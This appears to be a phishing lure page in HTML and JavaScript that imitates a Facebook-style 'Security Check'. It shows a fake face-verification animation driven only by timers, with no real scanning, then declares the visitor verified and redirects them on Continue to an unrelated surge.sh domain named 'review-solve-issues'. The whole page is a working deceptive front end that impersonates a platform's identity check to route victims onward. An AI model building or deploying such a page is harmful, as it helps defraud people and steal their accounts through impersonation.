
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Verification</title>
<style>
  :root{
    --bg: #ffffff;
    --card: #ffffff;
    --muted: #6b7280;
    --accent: #1877f2; /* FB blue */
    --success: #1877f2;
    --radius: 14px;
    --shadow: 0 10px 36px rgba(16,24,40,0.08);
  }
  body{
    margin:0; font-family:Inter, system-ui; background:var(--bg);
    display:flex; align-items:center; justify-content:center; height:100vh;
  }
  .card{
    width:100%; max-width:520px; background:var(--card); border-radius:var(--radius);
    padding:34px; box-shadow:var(--shadow); text-align:center;
  }
  h1{margin:0; font-size:22px; font-weight:700; color:#1c1e21}
  p.lead{margin:8px 0 20px; color:var(--muted); font-size:13px}

  .face-ring{width:130px;height:130px;border-radius:50%;margin:auto;position:relative;
    background:linear-gradient(180deg,#ffffff,#f5f7fa); box-shadow:0 8px 20px rgba(0,0,0,0.08);
    display:flex;align-items:center;justify-content:center;
  }

  .status{font-size:13px;color:var(--muted); margin-top:10px}

  .center-band{
    width:100%; max-width:420px; height:88px; margin:22px auto 0; border-radius:12px;
    background:#1877f2; color:#fff; display:flex; align-items:center; justify-content:center;
    font-size:16px; font-weight:600; box-shadow:0 8px 28px rgba(24,119,242,0.25);
  }

  .band-check{
    width:46px; height:46px; border-radius:50%; background:white; color:#1877f2;
    display:flex; align-items:center; justify-content:center; font-size:26px; font-weight:700;
    box-shadow:0 6px 16px rgba(0,0,0,0.15); margin-right:12px;
  }

  .controls{margin-top:20px}
  button.primary{
    background:var(--accent); color:white; border:0; padding:10px 18px;
    border-radius:12px; font-weight:700; font-size:15px; cursor:pointer;
    box-shadow:0 6px 20px rgba(24,119,242,0.35);
  }
  button.primary:disabled{opacity:0.55; cursor:not-allowed}
</style>
</head>
<body style="background:#1877f2;">
  <div class="card" id="cardBox" style="display:none;">
    <h1>Security Check</h1>
    <p class="lead">We need to verify your identity</p>

    <div class="face-ring">
      <div id="tickIcon" style="font-size:48px;color:#1877f2; display:none;">✓</div>
    </div>

    <div class="status" id="statusMsg">Initializing…</div>

    <div class="center-band" id="centerBand" style="background:#1877f2; box-shadow:none; color:white;">
      <div class="band-check" style="background:white; color:#1877f2;">✓</div>
      <div id="bandText">Scanning…</div>
    </div>

    <div class="controls">
      <button class="primary" id="continueBtn" disabled>Continue</button>
    </div>
  </div>

<script>
  const cardBox = document.getElementById("cardBox");
  const tickIcon = document.getElementById("tickIcon");
  const statusMsg = document.getElementById("statusMsg");
  const bandText = document.getElementById("bandText");
  const continueBtn = document.getElementById("continueBtn");

  cardBox.style.display = "block";

  // Simulated scanning progress
  const steps = [
    {msg:"Locating face…", time:800},
    {msg:"Analyzing depth…", time:800},
    {msg:"Checking integrity…", time:900},
    {msg:"Verifying…", time:900}
  ];

  let i=0;
  function nextStep(){
    if(i>=steps.length){ finishScan(); return; }
    statusMsg.textContent = steps[i].msg;
    bandText.textContent = "Scanning…";
    i++;
    setTimeout(nextStep, steps[i-1].time);
  }

  setTimeout(()=>{ nextStep(); },400);

  function finishScan(){
    tickIcon.style.display = "block";
    statusMsg.textContent = "Face verified";
    statusMsg.style.color = "#ffffff";
    bandText.textContent = "You're not a robot";
    continueBtn.disabled = false;
  }

  continueBtn.addEventListener('click', ()=>{
    continueBtn.textContent = "Redirecting…";
    continueBtn.disabled = true;
    setTimeout(()=>{
      window.location.href = "https://review-solve-issues.surge.sh";
    },700);
  });
</script>
</body>
</html>
